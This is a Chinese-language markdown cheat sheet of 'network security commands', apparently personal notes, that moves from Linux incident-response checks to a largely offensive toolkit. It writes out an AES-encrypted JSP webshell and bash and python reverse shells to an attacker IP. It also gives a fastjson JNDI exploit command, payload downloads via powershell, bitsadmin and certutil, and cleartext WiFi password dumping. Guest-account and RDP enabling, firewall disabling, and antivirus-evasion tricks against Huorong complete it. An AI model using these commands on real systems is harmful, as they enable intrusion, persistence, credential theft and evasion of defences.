---
title: 网络安全常用命令
icon: file-shield
date: 2022-04-16
lastUpdated: false
---

## Linux应急

```sh
# 查看Linux中占用资源情况
top -c -o %CPU

# cpu占用前5的信息
ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5

# 查看网络通信的情况
lsof -i -PnR

# 寻找pid对应的进程
ps aux | grep [pid]

# 查看进程打开的文件
lsof -p [pid]

# 查看网络和端口情况
netstat -utnpl

# 显示进程和端口的对应关系
lsof -i :[port]

# 某个pid对应的文件路径
ls -l /proc/[pid]/exe
file /proc/[pid]/exe

# 使用iptables屏蔽ip
iptables -A INPUT/OUTPUT -s/d [目标ip] -j ACCEPT/DROP

# 用iptables封锁和x.com的域名通信
iptables -I INPUT -p tcp --dport 80 -m string --string "x.com" --algo bm -j DROP

# 进行对比两个进程
ps -ef | awk '{print}' | sort -n | uniq >1
ls /proc | sort -n | uniq >2
diff 1 2

# 特殊权限文件查找
find / *.jsp -perm 4777

# 被入侵的系统，肯定有文件被改动，通过比较文件的md5，创建时间，文件路径
find / -uid 0 -print 查找特权文件
find / -size +10000k -print
find / -name "..." -print
md5sum -b [文件名]
whereis [文件名]


# 账号检查
w # 查看系统信息
cat /etc/passwd 用户信息文件
cat /etc/shadow 用户密码
less /etc/passwd
ls -l /etc/passwd 查看文件修改时间
usermod -L [user] 锁定用户 -U 解锁用户
userdel [user] 删除用户
userdel -r [user] 删除用户和他的home

# 用户登录检查
last
lastb
```

## 防火墙相关

```sh
# Ubuntu / Debian 
sudo ufw disable 
 
# CentOS / Fedora / RHEL 
sudo systemctl stop firewalld 
sudo systemctl disable firewalld 

# Arch Linux 
sudo systemctl stop iptables 
sudo systemctl disable iptables 

# openSUSE 
sudo systemctl stop SuSEfirewall2 
sudo systemctl disable SuSEfirewall2 
 
#  Gentoo 
sudo rc-update delete iptables default 
sudo /etc/init.d/iptables stop 
 
# Slackware 
sudo /etc/rc.d/rc.firewall stop 
 
# Alpine Linux 
sudo /etc/init.d/iptables stop 
sudo rc-update del iptables
```

## 爆破常用

```sh
# 端口扫描:
sudo nmap -sT --min-rate 10000 -p- 127.0.0.1
sudo nmap -p- -Pn --min-rate 10000 127.0.0.1
sudo nmap -sT -sV -sC -O -p80,139 127.0.0.1
TARGET=127.0.0.1 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

# 目录爆破:
dirsearch -u http://127.0.0.1 -f -e zip,jar,tar.gz --wordlists=/usr/share/dirb/wordlists/common.txt
dirsearch -u http://127.0.0.1 -x 403
dirsearch -u http://127.0.0.1 -x 403,401 -w /usr/share/wordlists/dirb/big.txt

gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
gobuster dir -u http://127.0.0.1 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
gobuster dir -k -u https://127.0.0.1 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 

feroxbuster -u http://127.0.0.1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
feroxbuster -u http://127.0.0.1 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

wfuzz -u http://127.0.0.1/?FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/burp-paraameter-names.txt -H "cookie: PHPSESSID=asdh231asdad" --hh 1678
wfuzz -u http://127.0.0.1 -w /usr/share/wordlists/rockyou.txt -d "key=FUZZ" --hw 25

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://127.0.0.1/FUZZ -t 50 -mc 200

# domain brute:
wfuzz -u http://127.0.0.1 -H "HOST: FUZZ.127.0.0.1" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
wfuzz -u http://127.0.0.1 -H "HOST: FUZZ.127.0.0.1" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315
wfuzz -H "Host: FUZZ.127.0.0.1" --hc 302,400 -t 50 -H "User-Agent: luzesec" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://127.0.0.1
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://127.0.0.1 -H "Host: FUZZ.127.0.0.1" --hl 7
gobuster vhost -u http://127.0.0.1 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 20 -o gobuster_vhost.txt

# ssrf探测:
ffuf -w /opt/SecLists/Fuzzing/4-digits-0000-9999.txt -u 'http://127.0.0.1/?url="http://127.0.0.1:FUZZ"' -fs 0
```

## 其他

::: tip 常用命令

## windows查找文件
`dir c:\ /s /b | find "win.ini"`


## linux查找文件
`find / -name passwd`

## windows写文件
`echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^> >> C:/x/x.jsp`

`echo ^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^> >> C:/x/x.jsp`

`echo ^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >> C:/x/x.jsp`

## linux写文件
`echo xxxxx== |base64 -d > /var/www/html/1.jsp`

## 获取操作系统命令
`wmic OS get Caption,CSDVersion,OSArchitecture,Version`

## 主机收集
- 查看rdp链接记录 `cmdkey /list`
- 查看dns记录 `ipconfig /displaydns`
- 查看arp记录 `arp -a`
- 查看在线用户 `qwinsta`
- 查看系统的盘符 `wmic logicaldisk where DriveType=3 get DeviceID`
- 查看所有用户的`sid wmic useraccount get name,sid`
- windows查看桌面目录 `reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /s`
- 查看浏览记录 `reg query "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs"`
- 根据进程查找进程文件
  `wmic process where name="xxxx.exe" get processid,executablepath,name`
  `wmic process where name="chrome.exe" list full`

- 查看当前系统是否有屏保保护，延迟是多少
  `wmic desktop get screensaversecure,screensavertimeout`

- 查看当前系统是否是VMWARE
  `wmic bios list full | find /i "vmware"`

- 显示系统中的曾经连接过的无线密码
  `netsh wlan show profiles`

### windows常用的系统变量

- 查看当前用户目录`echo %HOMEPATH%`
- 查看当前目录`echo %CD%`
- 列出用户共享主目录的网络路径`echo %HOMESHARE%`
- 列出有效的当前登录会话的域名控制器名
- 列出了可执行文件的搜索路径`echo %Path%`
- 列出了处理器的芯片架构`echo %PROCESSOR_ARCHITECTURE%`
- 列出了Program Files文件夹的路径`echo %ProgramFiles%`
- 列出了当前登录的用户可用应用程序的默认临时目录`echo %TEMP% and %TMP%`
- 列出了当前登录的用户可用应用程序的默认临时目录`echo %TEMP% and %TMP%`
- 列出了包含用户帐号的域的名字`echo %USERDOMAIN%`
- 列出操作系统目录的位置`echo %WINDIR%`
- 返回“所有用户”配置文件的位置`echo %ALLUSERSPROFILE%`
- 返回处理器数目`echo %NUMBER_OF_PROCESSORS%`
- powershell地址`echo %PSModulePath%`



## 查看wifi密码
`for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear`

## fastjson执行命令
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,cGluZyBgd2hvYW1pYC4xZnUwYnguZG5zbG9nLmNu}|{base64,-d}|{bash,-i}" -A "x.x.x.x"`

## linux反弹shell
`bash -i >& /dev/tcp/[ip]/5555 0>&1`

`exec 5<>/dev/tcp/[ip]/5555;cat <&5|while read line;do $line >&5 2>&1;done`

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

## 查看是否跨网段

Windows:`route print`
Linux:`route`
mac:`netstat -nr`

## powershell

certutil写文件

certutil编码文件 `certutil -encode 1.txt output.txt`

certutil解码文件 `certutil -decode output.txt input.txt`

powershell写入 `powershell -c "'xxxxxxxx' | Out-File input.txt -Append"`

powershell写入方法2 `powershell -c "add-content C:\1.bat -value \"test\""`

powershell写入方法2后续(去除换行) `powershell "-join((gc -LiteralPath \"c:\1.bat\"))"`

## windows探测

`for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i "ttl"`

`for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i "ttl">>"c:\a.txt"`

`for /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i "ttl"`

## linux探测

`for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived; fi; done`

## certutil powershell探测出网

`certutil -urlcache -split -f http://pibfq6603bhlew7kjztwvnepwg26qv.burpcollaborator.net`

`powershell Invoke-WebRequest "http://aq4xs444jvmwj3831uxpe9cl6cc20r.burpcollaborator.net/"`

## windows 2008 开启3389

`wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1`

`wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1`

`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`

## 查看防火墙规则

`netsh firewall show config`
`netsh firewall show state`

## windows查看计划任务

`schtasks /QUERY /fo LIST /v`

## windows下载文件常用命令

`powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/payload.txt','payload.exe')`

`bitsadmin /transfer n http://192.168.28.128/payload.txt C:\Users\administrator\Desktop\1.txt`

`certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php`

## windows查看历史命令

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

`type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

## windows自带压缩

- **windows自带的解压命令** `iexpress`

  **windows自带的压缩命令，压缩成啥看自己**`zip,rar,cab`

   `makecab 1.doc 1.zip`

- **解压命令**

  `expand 1.zip 1.doc`

- **先把要解压的多个文件名写入txt**

   `dir /b >>name.txt`

  **压缩**

   `makecab /f name.txt /d maxdisksize=1024000`

  **解压缩**

  `expand 1.cab -f:* c:\test\`

## windows计算文件hash

`certutil.exe -hashfile 1.txt`

## windows设置终端代理 

`set http_proxy=http://127.0.0.1:1080`

## windows强制停止进程

**停止指定pid进程**

`taskkill /f /pid 3352`

**停止指定exe**

`taskkill /f /im explor.exe`

## windows通过dns查找进程

`for /F %i in ('wmic process get Name ^| findstr ".exe"') do ping -n 1 %i.******.dnslog.cn >nul`

## windows激活guest

**激活guest用户**

`net user guest /active:yes`

**更改guest用户的密码**

`net user guest mstlab`

## windows查询终端端口

`REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber`

## 绕过火绒

`copy c:\windows\system32\net1.exe aaa.txt`
`aaa.txt user xxxx 123456 /add`

**绕过火绒下载文件**

`"c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f https://url/1.exe 1.exe`

## CS上转发3389端口避免告警

`portfwd add -r 127.0.0.1 -p 3389 -l 1234`

:::